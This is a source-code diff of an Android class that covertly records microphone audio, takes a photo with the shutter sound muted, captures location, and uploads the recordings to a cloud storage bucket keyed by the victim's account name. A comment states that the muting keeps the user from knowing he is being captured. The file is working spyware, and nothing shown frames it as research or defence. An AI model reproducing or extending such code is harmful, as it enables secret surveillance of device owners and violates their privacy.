@@ -10,7 +10,6 @@ import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.Looper;
 import android.support.annotation.NonNull;
 import android.util.Log;
 import android.widget.Toast;
@@ -18,16 +17,14 @@ import android.widget.Toast;
 import com.amazonaws.auth.CognitoCachingCredentialsProvider;
 import com.amazonaws.regions.Regions;
 import com.amazonaws.services.s3.AmazonS3Client;
-import com.amazonaws.services.s3.model.ObjectMetadata;
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationListener;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 
-import java.io.ByteArrayInputStream;
 import java.io.File;
-import java.io.InputStream;
+import java.io.FileOutputStream;
 import java.util.List;
 
 import co.poweramp.crackapp.Constants;
@@ -40,16 +37,18 @@ import co.poweramp.crackapp.Util;
  * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
  */
 public class Job {
-    private final String TAG = "SpyReceiver";
+    private final String TAG = "Job";
     private Context context;
     private long timestamp;
-    private JobListener listener;
+    private JobCompletionListener listener;
     private Payload p = new Payload();
-    private int completedTasks = 0;
     private static AmazonS3Client sS3Client;
     private static CognitoCachingCredentialsProvider sCredProvider;
 
-    public Job(Context context, @NonNull JobListener listener) {
+    private String audioFilePath = null, imageFilePath = null;
+    private boolean isLocationCaptured = false, isAudioRecorded = false, isPictureTaken = false;
+
+    public Job(Context context, @NonNull JobCompletionListener listener) {
         this.context = context;
         this.listener = listener;
         this.timestamp = System.currentTimeMillis();
@@ -64,11 +63,60 @@ public class Job {
      * Check for completion
      */
     private void complete() {
-        if (completedTasks != 3) {
+        if (!(isLocationCaptured && isAudioRecorded && isPictureTaken)) {
+            Log.d(TAG, "completion callback called without all 3 fulfilled");
             return;
         }
-        listener.onComplete(p);
+        listener.onComplete(this, p);
         Log.d(TAG, "onComplete with payload!");
+    }
+
+    /**
+     * Clean up saved files. If any failure, ignore.
+     */
+    private void cleanup() {
+        File audioFile = new File(audioFilePath), imageFile = new File(imageFilePath);
+        audioFile.delete();
+        imageFile.delete();
+    }
+
+    /**
+     * Upload to S3
+     */
+    public void upload(final UploadCompletionListener listener) {
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                //Audio
+                File audioFile = new File(audioFilePath);
+                String audioObjName = String.format("%s/%d/audio.aac", getMainAccount().name, timestamp);
+                try {
+                    getS3Client(context).putObject(Constants.BUCKET_NAME, audioObjName, audioFile);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    listener.onFailure();
+                    return;
+                }
+                p.setAudio(audioObjName);
+                Log.d(TAG, "Uploaded audio to S3");
+
+                //Image
+                File imageFile = new File(imageFilePath);
+                String imageObjName = String.format("%s/%d/image.jpg", getMainAccount().name, timestamp);
+                try {
+                    getS3Client(context).putObject(Constants.BUCKET_NAME, imageObjName, imageFile);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    listener.onFailure();
+                    return;
+                }
+                p.setImage(imageObjName);
+                Log.d(TAG, "Uploaded image to S3");
+                listener.onSuccess(p);
+                cleanup();
+            }
+        });
+        thread.start();
     }
 
     private Account[] getAccounts() {
@@ -84,14 +132,8 @@ public class Job {
         final MediaRecorder recorder = new MediaRecorder();
         recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        final File tempFile;
-        try {
-            tempFile = File.createTempFile("record-", ".aac");
-        } catch (Exception e) {
-            e.printStackTrace();
-            return;
-        }
-        recorder.setOutputFile(tempFile.getAbsolutePath());
+        final File audioFile = new File(context.getFilesDir(), String.format("audio-%d.aac", timestamp));
+        recorder.setOutputFile(audioFile.getAbsolutePath());
         recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
         recorder.setMaxDuration(10000);
         try {
@@ -99,35 +141,19 @@ public class Job {
             recorder.start();
         } catch (Exception e) {
             e.printStackTrace();
+            cleanup();
+            listener.onFailure(Job.this);
             return;
         }
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
-                Toast.makeText(context, "Recorded audio of length " + tempFile.length(), Toast.LENGTH_LONG).show();
+                Toast.makeText(context, "Recorded audio of length " + audioFile.length(), Toast.LENGTH_LONG).show();
                 recorder.stop();
                 recorder.release();
-                Thread thread = new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        Looper.prepare();
-                        //TODO: Send file out to S3
-                        String objectName = String.format("%s/%d/audio.aac", getMainAccount().name, timestamp);
-                        try {
-                            getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, tempFile);
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                            Log.d(TAG, "S3 audio upload failed, ignoring.");
-                            return;
-                        }
-                        p.setAudio(objectName);
-                        completedTasks++;
-                        complete();
-                        tempFile.delete();
-                        Log.d(TAG, "S3 audio upload succeeded");
-                    }
-                });
-                thread.start();
+                audioFilePath = audioFile.getAbsolutePath();
+                isAudioRecorded = true;
+                complete();
             }
         }, 10000);
     }
@@ -152,8 +178,13 @@ public class Job {
                 }
             }
             params.setPictureSize(bestWidth, bestHeight);
+            params.setJpegQuality(100);
             camera.setParameters(params);
             camera.startPreview();
+            //Mute the shutter sound so user doesn't know he's being captured
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                camera.enableShutterSound(false);
+            }
             camera.takePicture(new Camera.ShutterCallback() {
                 @Override
                 public void onShutter() {
@@ -170,39 +201,28 @@ public class Job {
                     //JPEG
                     camera.stopPreview();
                     camera.release();
-                    //Mute the shutter sound so user doesn't know he's being captured
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
-                        camera.enableShutterSound(false);
-                    }
                     Toast.makeText(context, "Captured JPEG bytes: " + bytes.length, Toast.LENGTH_LONG).show();
-                    //TODO: Send image to S3
-                    Thread thread = new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            Looper.prepare();
-                            InputStream inputStream = new ByteArrayInputStream(bytes);
-                            ObjectMetadata metadata = new ObjectMetadata();
-                            metadata.setContentType("image/jpeg");
-                            metadata.setContentLength(bytes.length);
-                            String objectName = String.format("%s/%d/image.jpg", getMainAccount().name, timestamp);
-                            try {
-                                getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, inputStream, metadata);
-                            } catch (Exception e) {
-                                e.printStackTrace();
-                                Log.d(TAG, "S3 image upload failed, ignoring.");
-                                return;
-                            }
-                            Log.d(TAG, "S3 image upload succeeded");
-                            p.setImage(objectName);
-                            completedTasks++;
-                            complete();
-                        }
-                    });
-                    thread.start();
+
+                    File imageFile = new File(context.getFilesDir(), String.format("image-%d.jpg", timestamp));
+                    try {
+                        FileOutputStream fileOutputStream = new FileOutputStream(imageFile);
+                        fileOutputStream.write(bytes);
+                        fileOutputStream.close();
+                        imageFilePath = imageFile.getAbsolutePath();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        cleanup();
+                        listener.onFailure(Job.this);
+                        return;
+                    }
+                    isPictureTaken = true;
+                    complete();
                 }
             });
         } catch (Exception e) {
             e.printStackTrace();
+            cleanup();
+            listener.onFailure(Job.this);
         }
     }
 
@@ -242,7 +262,7 @@ public class Job {
         public void onLocationChanged(Location location) {
             Log.d(TAG, "Retrieved location.");
             p.setLocation(location);
-            completedTasks++;
+            isLocationCaptured = true;
             complete();
             LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, this);
             mGoogleApiClient.disconnect();
@@ -251,6 +271,7 @@ public class Job {
         @Override
         public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
             Log.d(TAG, "Google Api Client connection failed: " + connectionResult.toString());
+            cleanup();
         }
     }
 
@@ -285,7 +306,13 @@ public class Job {
         return sS3Client;
     }
 
-    public interface JobListener {
-        void onComplete(Payload p);
+    public interface JobCompletionListener {
+        void onComplete(Job j, Payload p);
+        void onFailure(Job j);
+    }
+
+    public interface UploadCompletionListener {
+        void onSuccess(Payload p);
+        void onFailure();
     }
 }
